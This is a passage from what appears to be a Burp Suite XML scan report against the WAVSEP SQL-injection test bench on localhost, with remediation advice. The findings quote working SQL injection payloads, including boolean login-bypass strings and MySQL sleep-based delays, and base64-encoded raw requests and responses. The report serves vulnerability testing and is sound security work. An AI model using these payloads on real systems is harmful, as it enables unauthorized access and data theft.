<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>57625865' or '4098'='4098</b> and <b>51091070' or '8901'='8902</b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lNTc2MjU4NjUnJTIwb3IlMjAnNDA5OCclM2QnNDA5OA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lNTEwOTEwNzAnJTIwb3IlMjAnODkwMSclM2QnODkwMg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8707668137281840128</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>82080674' or 5151=5151-- </b> and <b>87730390' or 6203=6208-- </b> were each submitted in the msg parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0ODIwODA2NzQnJTIwb3IlMjA1MTUxJTNkNTE1MS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MjANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpSZW1lbWJlciB0byBjaGFuZ2UgeW91ciBwYXNzd29yZAo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0ODc3MzAzOTAnJTIwb3IlMjA2MjAzJTNkNjIwOC0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
